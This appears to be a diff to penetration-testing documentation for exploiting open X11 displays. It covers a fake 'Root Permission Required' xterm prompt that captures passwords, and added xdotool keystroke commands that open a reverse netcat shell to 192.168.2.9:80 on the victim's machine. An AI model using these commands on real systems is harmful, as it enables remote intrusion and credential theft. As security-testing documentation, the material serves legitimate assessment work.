@@ -174,8 +174,25 @@ This was tested against Ubuntu 12.04, 14.04, 16.04 and Solaris 10.
 1. start `xspy`
 2. `xterm -T "Root Permission Required" -display [ip]:0 -e "echo -e -n 'root password: '; read passwd; echo 'Authentication Failure'; echo -e -n 'root password: '; read passwd"`
   - Notice it asks twice for the password incase of a mistyped initial password.  This can also be adjusted to just say password or the real user's username
-  - The victim's typed text by the user will not be masked (*)
+  - The victim's typed text by the user will not be masked (`*`)
 
 ### Direct Exploitation
 
 Use `exploits/unix/x11/x11_keyboard_exec`
+
+### Typing Commands
+
+Similar to the method `exploits/unix/x11/x11_keyboard_exec` uses, its possible to use `xdotool` to run commands on the remote system.
+
+To install `xdotool` on kali simply run `apt-get install xdotool`
+
+Now, you can directly interact by typing commands (which appear on the users screen), an example would be running xterm and launching netcat.
+
+For this scenario we run a simple reverse netcat to 192.168.2.9:80
+
+```
+xdotool key alt+F2
+xdotool key x t e r m
+xdotool key KP_Enter
+xdotool key n c space 1 9 2 period 1 6 8 period 2 period 9 space 8 0 space minus e space slash b i n slash b a s h KP_Enter
+```
